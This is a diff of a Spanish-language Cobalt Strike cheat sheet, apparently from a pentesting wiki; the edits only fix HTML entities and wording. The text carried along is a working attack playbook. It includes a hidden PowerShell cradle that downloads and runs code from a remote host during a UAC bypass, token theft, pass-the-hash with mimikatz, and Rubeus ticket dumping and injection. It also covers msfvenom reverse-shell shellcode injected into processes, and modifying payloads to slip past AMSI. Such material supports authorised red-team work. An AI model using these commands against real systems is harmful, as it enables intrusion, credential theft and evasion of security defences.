@@ -19,7 +19,7 @@ Los beacons de estos listeners no necesitan comunicarse directamente con el C2, 
 
 #### Generate payloads in files
 
-`Attacks -> Packages ->`&#x20;
+`Attacks -> Packages ->`
 
 * **`HTMLApplication`** para archivos HTA
 * **`MS Office Macro`** para un documento de office con una macro
@@ -37,7 +37,7 @@ Si ya tienes el archivo que deseas alojar en un servidor web, solo ve a `Attacks
 ### Beacon Options
 
 <pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
-execute-assembly &#x3C;/path/to/executable.exe>
+execute-assembly </path/to/executable.exe>
 
 # Screenshots
 printscreen    # Toma una captura de pantalla única mediante el método PrintScr
@@ -56,7 +56,7 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 # Powershell
 # Importar módulo de Powershell
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;solo escribe el cmd de powershell aquí>
+powershell <solo escribe el cmd de powershell aquí>
 
 # User impersonation
 ## Generación de token con credenciales
@@ -66,20 +66,20 @@ rev2self # Deja de usar el token generado con make_token
 ## El uso de make_token genera el evento 4624: Una cuenta se ha iniciado sesión correctamente. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando por el Tipo de Inicio de Sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.
 
 # UAC Bypass
-elevate svc-exe &#x3C;listener>
-elevate uac-token-duplication &#x3C;listener>
+elevate svc-exe <listener>
+elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Robar token de pid
 ## Como make_token pero robando el token de un proceso
 steal_token [pid] # Además, esto es útil para acciones de red, no acciones locales
-## De la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Por eso la salida del Beacon dice Impersonated &#x3C;current_username> - está suplantando nuestro propio token clonado.
+## De la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Por eso la salida de Beacon dice Impersonated <current_username> - está suplantando nuestro propio token clonado.
 ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
 rev2self # Deja de usar el token de steal_token
 
-## Lanzar proceso con nuevas credenciales
+## Lanzar proceso con nuevas credenciales
 spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
-## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
+## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente, pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
 
 ## Inyectar en proceso
 inject [pid] [x64|x86] [listener]
@@ -91,36 +91,36 @@ pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash a través de mimikatz
-mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá el shell (si estás ejecutando como SYSTEM, estás bien)
-steal_token &#x3C;pid> #Robar token del proceso creado por mimikatz
+mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
+## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá la shell (si estás ejecutando como SYSTEM, estás bien).
+steal_token <pid> #Robar token del proceso creado por mimikatz
 
 ## Pass the ticket
 ## Solicitar un ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Crear una nueva sesión de inicio de sesión para usar con el nuevo ticket (para no sobrescribir el comprometido)
-make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Escribir el ticket en la máquina del atacante desde una sesión de powershell &#x26; cargarlo
+make_token <domain>\<username> DummyPass
+## Escribir el ticket en la máquina del atacante desde una sesión de powershell y cargarlo
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
 ## Pass the ticket desde SYSTEM
 ## Generar un nuevo proceso con el ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
 ## Robar el token de ese proceso
-steal_token &#x3C;pid>
+steal_token <pid>
 
 ## Extraer ticket + Pass the ticket
 ### Listar tickets
 execute-assembly C:\path\Rubeus.exe triage
 ### Volcar ticket interesante por luid
-execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Crear nueva sesión de inicio de sesión, anotar luid y processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Insertar ticket en la sesión de inicio de sesión generada
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Finalmente, robar el token de ese nuevo proceso
-steal_token &#x3C;pid>
+steal_token <pid>
 
 # Lateral Movement
 ## Si se creó un token, se utilizará
@@ -157,12 +157,12 @@ beacon> spawn metasploit
 
 # Pass session to Metasploit - Through shellcode injection
 ## En el host de metasploit
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Ejecuta msfvenom y prepara el listener multi/handler
 
 ## Copia el archivo bin a la máquina host de cobalt strike
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un proceso x64
+shinject <pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un proceso x64
 
 # Pass metasploit session to cobalt strike
 ## Genera shellcode Beacon stageless, ve a Attacks > Packages > Windows Executable (S), selecciona el listener deseado, selecciona Raw como el tipo de salida y selecciona Usar carga útil x64.
@@ -194,7 +194,7 @@ No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cob
 
 La carpeta ResourceKit contiene las plantillas para las cargas útiles basadas en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.
 
-Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar lo que el defensor (AMSI en este caso) no acepta y modificarlo:
+Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar qué es lo que el defensor (AMSI en este caso) no acepta y modificarlo:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
